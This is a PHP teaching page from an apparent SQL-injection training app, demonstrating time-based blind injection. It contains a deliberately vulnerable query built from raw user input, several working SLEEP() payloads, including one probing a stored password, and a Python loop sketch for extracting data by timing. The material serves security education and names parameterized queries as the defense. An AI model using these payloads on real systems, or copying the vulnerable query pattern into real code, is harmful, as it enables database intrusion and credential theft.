<?php
/**
 * DEMO: Blind Time-Based SQL Injection
 *
 * Attack goal: No output, no errors, no visual difference — attacker
 * uses SLEEP() to confirm injection and extract data via response delay.
 *
 * Try these payloads:
 *   1 AND SLEEP(3)                                 → page pauses 3s = vulnerable
 *   1 AND IF(1=1, SLEEP(3), 0)                     → conditional sleep (true)
 *   1 AND IF(1=2, SLEEP(3), 0)                     → no sleep (false)
 *   1 AND IF(substring(database(),1,1)='s', SLEEP(3), 0)   → is first char of DB name 's'?
 *   1 AND IF(substring((SELECT password FROM user WHERE id=8),1,1)='1', SLEEP(3), 0)
 */

if ( ! defined('SQL_INJECTION_IN_PHP') ) {
    die('Direct access not permitted');
}
?>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white">
    <strong>⚠️ Vulnerable Page — Time-Based Blind Injection Demo</strong>
  </div>
  <div class="card-body">
    <p class="mb-1"><strong>Objective:</strong> Extract data using only response timing — no output, no errors, no visible difference.</p>
    <p class="mb-1"><strong>Try these payloads:</strong></p>
    <ul class="mb-0">
      <li><code>1 AND SLEEP(3)</code> → page pauses ~3 seconds = confirmed vulnerable</li>
      <li><code>1 AND IF(1=1, SLEEP(3), 0)</code> → sleeps (true)</li>
      <li><code>1 AND IF(1=2, SLEEP(3), 0)</code> → no sleep (false)</li>
      <li><code>1 AND IF(substring(database(),1,1)='s', SLEEP(3), 0)</code> → probe DB name first char</li>
      <li><code>1 AND IF(substring((SELECT password FROM user WHERE id=8),1,1)='1', SLEEP(3), 0)</code> → probe password</li>
    </ul>
    <p class="mt-2 mb-0 text-muted small">
      This defeats error suppression AND output suppression. The only defense is parameterized queries.
      Notice the page response is always identical — timing is the only signal.
    </p>
  </div>
</div>

<form method="get" class="mb-3">
  <input type="hidden" name="action" value="time_based"/>
  <div class="input-group" style="max-width:400px">
    <span class="input-group-text">User ID</span>
    <input type="text" name="uid" class="form-control"
           placeholder="e.g. 1"
           value="<?= htmlspecialchars($_GET['uid'] ?? '') ?>">
    <button class="btn btn-outline-secondary" type="submit">Lookup</button>
  </div>
</form>

<?php
$uid     = $_GET['uid'] ?? '';
$start   = microtime(true);

if ($uid !== '') {
    // Intentionally vulnerable
    $sql = "SELECT id FROM user WHERE id = {$uid}";

    try {
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_SILENT);
        $pdo->query($sql);
    } catch (\Exception $e) {
        // Errors are completely swallowed — attacker gets nothing
    }

    $elapsed = round(microtime(true) - $start, 3);

    // The response is always the same — observer can only use timing
    echo '<div class="alert alert-secondary"><strong>Generated SQL (normally hidden):</strong><br>'
         . '<code>' . htmlspecialchars($sql) . '</code></div>';

    echo '<div class="alert alert-info">';
    echo '<strong>Response:</strong> Lookup complete. (No output — attacker sees nothing.)<br>';
    echo '<strong>Server-side response time:</strong> <code>' . $elapsed . 's</code>';
    if ($elapsed >= 2) {
        echo ' <span class="badge bg-danger">Slow response detected — SLEEP() likely triggered!</span>';
    }
    echo '</div>';

    echo '<div class="mt-3 p-3 bg-light border rounded">';
    echo '<strong>How automated extraction works:</strong><br>';
    echo 'An attacker scripts this loop:<br>';
    echo '<pre class="mb-0">for char in a-z A-Z 0-9:
    payload = f"1 AND IF(substring(password,{pos},1)=\'{char}\', SLEEP(3), 0)"
    start = time.time()
    requests.get(url, params={\'uid\': payload})
    if time.time() - start >= 3:
        found_char = char  # this is the character at position {pos}</pre>';
    echo '</div>';
}
?>
